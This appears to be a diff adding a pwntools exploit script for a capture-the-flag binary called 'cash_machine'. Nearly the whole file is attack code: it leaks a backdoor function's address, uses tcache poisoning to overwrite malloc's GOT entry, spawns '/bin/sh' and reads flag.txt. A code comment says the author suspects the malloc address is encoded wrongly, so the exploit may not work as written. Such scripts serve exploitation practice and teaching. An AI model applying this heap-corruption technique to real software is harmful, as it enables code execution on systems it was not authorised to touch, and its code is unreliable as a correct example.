@@ -1,0 +1,113 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./cash_machine", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def create_cashbox(name, size_in_bytes, money_value):
+    io.recv().decode("utf-8")
+    io.sendline(b"1")
+    io.recv().decode("utf-8")
+    io.sendline(bytes(name, "ASCII"))
+    io.recv().decode("utf-8")
+    io.sendline(bytes(str(size_in_bytes), "ASCII"))
+    io.recv().decode("utf-8")
+    io.sendline(bytes(str(money_value), "ASCII"))
+
+def update_cashbox(index, new_money):
+    io.recv().decode("utf-8")
+    io.sendline(b"3")
+    io.recv().decode("utf-8")
+    io.sendline(bytes(str(index), "ASCII"))
+    io.recv().decode("utf-8")
+    io.sendline(b"\n")
+    io.recv().decode("utf-8")
+    io.sendline(b"\n")
+    io.recv().decode("utf-8")
+    io.sendline(new_money)
+
+def delete_cashbox(number):
+    io.recv().decode("utf-8")
+    io.sendline(b"4")
+    io.recv().decode("utf-8")
+    io.sendline(bytes(str(number), "ASCII"))
+
+
+def main():
+    global io
+    io = start()
+
+    # We need to grab function address of atm_backdoor() because it changes in execution
+    io.recv().decode("utf-8")
+    io.sendline(b"5")
+    backdoor_addr_raw = io.recvuntil(b"?\n")[39:53]
+    backdoor_addr = str(int(backdoor_addr_raw.decode("utf-8"), 0))
+
+    # the vulnerability is tcache poisining in regards of the backdoor function
+    # void atm_backdoor(char *backdoor_cmd){
+    #   system(backdoor_cmd);
+    #   return;
+    # }
+
+    # i think the error is here and we cant properly encode the malloc address in the right way
+    malloc_address = 93824992247928 # in got the address of malloc (converted to decimal)
+    malloc_address = struct.pack('<Q', malloc_address) # convert to bytes struct
+
+    # create the atm and select it
+    io.recv().decode("utf-8")
+    io.sendline(b"2")
+    io.recv().decode("utf-8")
+    io.sendline(bytes("atm", "ASCII"))
+    io.recv().decode("utf-8")
+    io.sendline(b"1")
+    io.recv().decode("utf-8")
+    io.sendline(bytes(str(1), "ASCII"))
+
+    # setup the tcache by creating two cashboxes and deleting them
+    create_cashbox("cashbox1", 56, 1)
+    create_cashbox("cashbox2", 56, 2)
+    delete_cashbox(1)
+    delete_cashbox(2)
+
+    # change tcache_entry "*next" to the address of malloc in got
+    update_cashbox(1, malloc_address)
+    # now we need to get rid of the tcache entry
+    create_cashbox("cashbox3", 56, 3)
+    # next step is to write backdoor address in to the got
+    create_cashbox("payload", 56, backdoor_addr)
+
+    # the last step is to invoce the malloc function 
+    # it should now point to the backdoor function
+    io.recv().decode("utf-8")
+    io.sendline(b"1")
+    io.recv().decode("utf-8")
+    io.sendline(b"execute")
+    io.recv().decode("utf-8")
+    # now we can just give the malloc /bin/sh to get a shell
+    io.sendline(b"/bin/sh")
+    io.recv().decode("utf-8")
+    # collect the flag
+    io.sendline(b"cat flag.txt")
+    print(io.recvuntil(b"}").split()[-1].decode("utf-8"))
+
+
+
+if __name__ == "__main__":
+    main()
